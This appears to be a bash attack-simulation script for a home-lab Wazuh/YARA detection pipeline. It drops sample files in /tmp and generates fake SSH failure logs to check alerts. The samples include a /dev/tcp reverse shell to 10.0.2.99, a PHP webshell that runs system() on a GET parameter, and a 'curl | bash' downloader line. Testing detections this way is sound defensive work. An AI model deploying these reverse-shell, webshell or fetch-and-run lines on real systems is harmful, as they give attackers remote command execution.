#!/usr/bin/env bash
# siem-home-lab :: controlled attack simulation
#
# Exercises the detection chain end to end against the local agent:
#   FIM (realtime) -> active response -> YARA -> decoder -> rule -> alert
#
# Everything it drops is inert: an EICAR test string and text files containing
# attack-shaped strings. Nothing is executed. Cleanup runs at the end.
#
# Run as root:  sudo bash scripts/attack-simulation/attack_sim.sh
set -u

STAGE="/tmp/shl-attack-sim"
AR_LOG="/var/ossec/logs/active-responses.log"
MARK_FILE="/tmp/shl-sim-marker"

echo "=============================================================================="
echo " siem-home-lab :: attack simulation"
echo " started $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "=============================================================================="

date +%s > "$MARK_FILE"
AR_LINES_BEFORE=$(wc -l < "$AR_LOG" 2>/dev/null || echo 0)

mkdir -p "$STAGE"

echo ""
echo "[1] Dropping EICAR test file (expect SHL_EICAR_Test_File)"
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n' \
    > "$STAGE/eicar_test.txt"

echo "[2] Dropping reverse-shell script (expect SHL_Linux_Reverse_Shell)"
cat > "$STAGE/rev_shell.sh" <<'PAYLOAD'
#!/bin/bash
# inert sample - never executed by this simulation
bash -i >& /dev/tcp/10.0.2.99/4444 0>&1
PAYLOAD

echo "[3] Dropping PHP webshell (expect SHL_PHP_Webshell)"
cat > "$STAGE/shell.php" <<'PAYLOAD'
<?php
// inert sample - never served or executed
if (isset($_GET['cmd'])) { system($_GET['cmd']); }
?>
PAYLOAD

echo "[4] Dropping miner config (expect SHL_Cryptominer_Config)"
cat > "$STAGE/miner.json" <<'PAYLOAD'
{ "pools": [ { "url": "stratum+tcp://pool.example.invalid:3333" } ],
  "donate-level": 1, "algo": "randomx" }
PAYLOAD

echo "[5] Dropping obfuscated downloader (expect SHL_Obfuscated_Shell_Payload)"
printf 'curl -s http://10.0.2.99/stage2.sh | bash\n' > "$STAGE/dropper.sh"

echo ""
echo "--- direct YARA scan of staged files (ground truth) ---"
yara -w -r /var/ossec/etc/yara/rules/siem_home_lab.yar "$STAGE" 2>&1 | sed 's/^/    /'

echo ""
echo "[6] Generating authentication telemetry (expect 100101 / 100102)"
for i in $(seq 1 12); do
    logger -p auth.info -t sshd \
      "Failed password for invalid user oracle from 10.0.2.99 port 4433$i ssh2"
done
echo "    12 SSH failure events written to the auth log"

echo ""
echo "[7] Touching a monitored credential file (expect FIM whodata + 100130)"
cp /etc/passwd /etc/passwd.shl-bak 2>/dev/null
echo "# siem-home-lab simulation marker" >> /etc/passwd.shl-bak
rm -f /etc/passwd.shl-bak

echo ""
echo "Waiting 45s for realtime FIM, active response and analysisd to settle..."
sleep 45

echo ""
echo "=============================================================================="
echo " RESULTS"
echo "=============================================================================="
AR_LINES_AFTER=$(wc -l < "$AR_LOG" 2>/dev/null || echo 0)
echo ""
echo "--- new active-response log entries (${AR_LINES_BEFORE} -> ${AR_LINES_AFTER}) ---"
if [ "$AR_LINES_AFTER" -gt "$AR_LINES_BEFORE" ]; then
    tail -n "$((AR_LINES_AFTER - AR_LINES_BEFORE))" "$AR_LOG" | grep -i yara | sed 's/^/    /' \
      || echo "    (new entries, but none from yara)"
else
    echo "    no new entries"
fi

echo ""
echo "--- YARA matches recorded ---"
grep -c "wazuh-yara.*Scan result" "$AR_LOG" 2>/dev/null | sed 's/^/    total matches in log: /'

echo ""
echo "Staged files left in $STAGE for inspection."
echo "Remove with:  sudo rm -rf $STAGE"
echo "=============================================================================="
